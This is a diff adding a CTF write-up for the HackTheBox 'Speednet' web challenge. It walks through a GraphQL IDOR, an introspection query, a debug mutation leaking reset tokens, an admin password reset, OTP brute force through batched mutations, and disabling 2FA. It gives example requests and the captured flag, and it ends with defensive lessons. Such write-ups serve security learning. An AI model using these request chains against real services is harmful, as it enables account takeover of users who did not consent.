@@ -1,13 +1,262 @@
 ---
-title: SpeedNet -  HTB BugBounty CTF 2025
-description: CTF write-up about GraphQL Attack.
+
+title: "Speednet — HTB Bug Bounty CTF"
+description: "CTF write-up: IDOR + GraphQL Introspection / batching + 2FA bypass"
 tags:
-  - ctf
-  - GraphQL
-  - web
+- ctf
+- IDOR
+- web
+- GraphQL
+- 2FA bypass
 author: TeTo
 authorGithub: TeTo-O
-date: "june 29, 2025 7:22 PM"
+date: "June 29, 2025"
 image: ""
 category: web
+
+---
+
+## Overview
+
+**Speednet** is an Internet Service Provider platform that enables users to purchase internet services. We invite you to participate in our bug bounty program to identify any potential vulnerabilities within the application and retrieve the flag hidden on the site.
+
+For your testing, we have provided additional email services. Please find the details below:
+
+```
+
+Email Site: `http://IP:PORT/emails/`
+Email Address: test@email.htb
+```
+
+Good luck, and thank you for your participation!
+> screenshot of the target homepage or the test webmail (soon).
+
+---
+
+## TL;DR
+
+* GraphQL endpoint with **introspection** enabled.
+* Admin data exposed by modifying `userId` (IDOR in GraphQL).
+* Discovery of a debug mutation `devForgotPassword` returning the reset token directly.
+* Admin password reset using the obtained token.
+* Admin login protected by a 4-digit OTP; exploited **GraphQL batching** to brute-force and obtain admin JWT.
+* Disabled 2FA via `updateProfile` and gained full access. Flag retrieved in the **Billing** section.
+
+---
+
+## Analysis
+
+After registering with `test@email.htb`, I began analyzing the traffic and observed that the application uses GraphQL at `/graphql`.
+
+Example request to fetch the profile (I was `userId: 2`):
+
+```json
+
+{
+   "query": 
+      "query GetUserProfile($userId: Int!) { 
+          userProfile(userId: $userId) { 
+            id 
+            email 
+            firstName 
+            lastName 
+            address 
+            phoneNumber 
+            twoFactorAuthEnabled 
+          }
+        }",
+   "variables": {
+      "userId": 2
+   }
+}
+
+```
+
+Changing `userId` to `1` returned the profile of `admin@speednet.htb`.
+
+**Conclusion:** the resolver does not validate the `userId` parameter, exposing a logical IDOR.
+
+> screenshot of the request and response showing admin email (soon).
+
+I then performed a GraphQL introspection to map all queries and mutations.
+
+---
+
+## Exploitation
+
+### 1) Introspection
+
+I performed full introspection using inQL + Burp to obtain all types, queries, and mutations. This was key to identify debug functionalities.
+
+```graphql
+
+query IntrospectionQuery {
+  __schema {
+    types {
+      name
+      fields {
+        name
+      }
+    }
+  }
+}
+```
+
+> introspection output highlighting `devForgotPassword` (soon).
+
+### 2) `devForgotPassword` — Retrieving Reset Token
+
+Calling the `devForgotPassword` mutation with my email returned the reset token directly:
+
+```http
+
+POST /graphql HTTP/1.1
+Content-Type: application/json
+
+{
+  "query": "mutation devForgotPassword($email: String!) {
+              devForgotPassword(email: $email)  
+            }",
+  "variables": { 
+    "email": "test@email.htb" 
+  }
+}
+```
+
+Sample response:
+
+```json
+
+{
+  "data": {
+    "devForgotPassword": "Dev only! Password reset token: 305c6179-d1f5-452d-9683-ef91efd79561"
+  }
+}
+```
+
+**Impact:** the mutation returns the token without verifying mailbox ownership, exposing a critical development function.
+
+> raw request and response of `devForgotPassword` (soon).
+
+### 3) Admin Password Reset
+
+The application provides a reset link like:
+
+```
+
+http://IP:PORT/reset-password?token={TOKEN}
+```
+
+Using the token, I accessed the link and set a new password for the admin account.
+
+> screenshot of the test mailbox showing the reset link and the reset form (soon).
+
+### 4) OTP (2FA) and GraphQL Batching
+
+After the password reset, admin login required an OTP sent via email. Without access to the admin mailbox, I analyzed the OTP flow with the test account and discovered it was **4 digits**.
+
+To bypass the admin mailbox limitation, I exploited **GraphQL batching**, allowing multiple operations per request and testing multiple OTPs simultaneously. The server accepted ~750 operations per batch, covering 0000–9999 in a few batches.
+
+Simplified batch request example:
+
+```json
+
+[
+  {
+    "id": "op1",
+    "query": "mutation VerifyOtp($token: String!, $otp: String!) {  
+                verifyOtp(token: $token, otp: $otp) {
+                  token
+                  user { 
+                    id  
+                    email
+                  }
+                }
+              }",
+    "variables": {"token": "<TOKEN_2FA>", "otp": "0000"}
+  },
+  {
+    "id": "op2",
+    "query": "mutation VerifyOtp($token: String!, $otp: String!) {
+                verifyOtp(token: $token, otp: $otp) {
+                  token       
+                  user { 
+                    id 
+                    email 
+                  }
+                }
+              }",
+    "variables": {"token": "<TOKEN_2FA>", "otp": "0001"}
+  }
+]
+```
+
+One batch response returned a valid JWT for the admin:
+
+```json
+
+{
+  "op4773": {
+    "token": "<JWT_ADMIN>",
+    "user": {
+      "id": 1,
+      "email": "admin@speednet.htb"
+    }
+  }
+}
+```
+
+> JSON of batch request and response highlighting `op4773` (soon).
+
+### 5) Disabling 2FA and Final Access
+
+Using the admin JWT, I executed the `updateProfile` mutation to set `twoFactorAuthEnabled` to `false`:
+
+```graphql
+
+mutation UpdateProfile($input: ProfileInput!) {
+  updateProfile(input: $input) {
+    email
+    firstName
+    lastName
+    address
+    phoneNumber
+    twoFactorAuthEnabled
+  }
+}
+```
+
+Example variables:
+
+```json
+
+{
+  "input": {
+    "firstName": "Arnold",
+    "lastName": "Robin",
+    "phoneNumber": "08718881012211",
+    "address": "West Land 123",
+    "twoFactorAuthEnabled": false
+  }
+}
+```
+
+After updating, I logged in as admin and retrieved the flag in the **Billing** section:
+
+```
+
+HTB{gr4phql_3xpl01t_1n_a_nutsh3ll_46a25713ddf23f712dfbe788f0ca2423}
+```
+
+> screenshots of `updateProfile` request, response (soon), and Billing page showing the flag (soon)
+
+---
+
+## Lessons Learned
+
+* **GraphQL is powerful but risky:** undocumented endpoints and debug mutations can expose sensitive functionality.
+* **IDOR in GraphQL:** resolvers that do not validate parameters (`userId`) can expose other users' data.
+* **Low-entropy 2FA/OTP + batching:** allows brute-force attacks even without rate limits.
+* **Dev/prod separation:** debug mutations like `devForgotPassword` should never be accessible in production.
+
 ---
